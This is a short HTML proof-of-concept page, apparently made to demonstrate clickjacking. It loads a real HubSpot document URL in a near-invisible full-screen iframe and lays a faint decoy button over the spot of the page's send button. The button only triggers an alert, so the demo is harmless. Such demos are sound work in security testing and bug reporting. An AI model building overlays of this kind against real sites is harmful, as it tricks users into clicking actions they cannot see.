<!DOCTYPE html>
<html>
<head>
    <title>Clickjacking Example</title>
    <style>
        body {
            margin: 0;
            padding: 0;
        }
        iframe {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            opacity: 0.01; /* iframe sangat transparan */
            pointer-events: none; /* menghindari interaksi langsung dengan iframe */
        }
        .container {
            position: relative;
            width: 100%;
            height: 100vh;
        }
        .visible-button {
            position: absolute;
            top: 70%; /* Atur posisi untuk menempatkan tombol di atas tombol Kirim */
            left: 50%;
            transform: translateX(-50%); /* Pusatkan tombol secara horizontal */
            padding: 10px 20px;
            background-color: rgba(0, 128, 255, 0.3); /* Transparansi tombol lebih tinggi (0.3) */
            border: none;
            color: white;
            font-size: 16px;
            cursor: pointer;
            opacity: 0.5; /* Lebih transparan, hampir tidak terlihat */
            transition: opacity 0.3s ease;
        }
        .visible-button:hover {
            opacity: 1; /* Ketika hover, tombol menjadi lebih terlihat */
        }
    </style>
</head>
<body>
    <div class="container">
        <iframe src="https://app-na1.hubspotdocuments.com/documents/6342798/view/1283972737?accessId=bea5ee" frameborder="0"></iframe>
        <button class="visible-button" onclick="alert('Button Clicked!')">Klik Saya!</button>
    </div>
</body>
</html>
